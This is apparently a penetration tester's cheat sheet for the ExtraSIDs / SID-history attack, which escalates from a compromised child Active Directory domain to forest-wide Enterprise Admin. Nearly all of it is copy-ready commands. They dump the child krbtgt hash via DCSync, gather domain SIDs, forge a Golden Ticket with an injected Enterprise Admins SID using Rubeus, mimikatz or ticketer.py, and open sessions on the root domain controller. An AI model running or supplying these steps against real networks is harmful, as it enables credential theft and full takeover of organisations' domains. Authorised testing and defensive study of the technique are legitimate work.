**ExtraSIDs / SID history (child -> parent forest takeover)** — in an intra-forest trust there is no SID filtering, so you can inject the SID of the root domain's **Enterprise Admins** group into a Golden Ticket forged in a compromised child domain. The result is Enterprise Admin across the whole forest.

**Note:** This works within a forest (e.g. a parent/child two-way trust). It does **not** work across cross-forest trusts, and it is blocked when SID filtering is enforced.

## Discovery - enumerate trusts

Windows, from a domain-joined child machine:

```batch

nltest /domain_trusts

```

Example - the current (child) domain is `dev.domain.local`, the target (parent) is `domain.local`:

```console

List of domain trusts:
    0: DOMAIN domain.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: DEV dev.domain.local (NT 5) (Forest: 0) (Primary Domain) (Native)

```

On Linux, enumerate trusts directly in BloodHound.

## What is needed and how to get it

- **Child domain krbtgt NT hash** - e.g. `112093609707726257e0959ce3e24771`

```bash

# Windows (mimikatz)
.\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
# Linux
secretsdump.py 'DEV/USER_NAME:USER_PASS@CHILD_DC_IP'

```

- **Child domain SID** - e.g. `S-1-5-21-2901893446-2198612369-2488268720`

```powershell

# Windows (PowerView)
Import-Module .\PowerView.ps1
Get-DomainSID

```

```bash

# Linux
lookupsid.py 'DEV/USER_NAME:USER_PASS@CHILD_DC_IP'

```

- **A target user in the child domain** - e.g. `Administrator`
- **The child FQDN** - e.g. `dev.domain.local`
- **The root domain Enterprise Admins SID** - e.g. `S-1-5-21-2879935145-656083549-3766571964-519` (the root domain SID + RID `519`)

```powershell

# Windows
Get-ADGroup -Identity "Enterprise Admins" -Server "domain.local"

```

```bash

# Linux (against the parent DC)
proxychains lookupsid.py 'dev.domain.local/Administrator:PASSWORD@PARENT_DC_IP' | grep "Enterprise Admins"

```

**Note:** RID `519` = Enterprise Admins (works only for the forest root). Use RID `512` for Domain Admins.

## Windows Attack

Create and inject the Golden Ticket with the extra SID:

```powershell

.\Rubeus.exe golden /rc4:112093609707726257e0959ce3e24771 /domain:dev.domain.local /sid:S-1-5-21-2901893446-2198612369-2488268720 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt

```

Also possible with mimikatz:

```cmd

mimikatz # kerberos::golden /user:Administrator /domain:dev.domain.local /sid:S-1-5-21-2901893446-2198612369-2488268720 /krbtgt:112093609707726257e0959ce3e24771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt

```

Then use the ticket against the root DC:

```powershell

Enter-PSSession -ComputerName DC01.domain.local -Authentication Kerberos

```

## Linux Attack

```bash

ticketer.py -nthash 112093609707726257e0959ce3e24771 -domain dev.domain.local -domain-sid S-1-5-21-2901893446-2198612369-2488268720 -extra-sid S-1-5-21-2879935145-656083549-3766571964-519 someAdmin
export KRB5CCNAME=someAdmin.ccache
psexec.py -k -no-pass dev.domain.local/someAdmin@DC01.domain.local

```

Use the forged ticket to DCSync the root DC - see [Dump NTDS.dit](../../Credential%20Dumping/Dump%20NTDS.dit.md).

## Caution

Golden Tickets are forged offline; the injected ticket lives in memory / a ccache. Note any artifacts in the report.

## References

- The Hacker Recipes - SID history - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
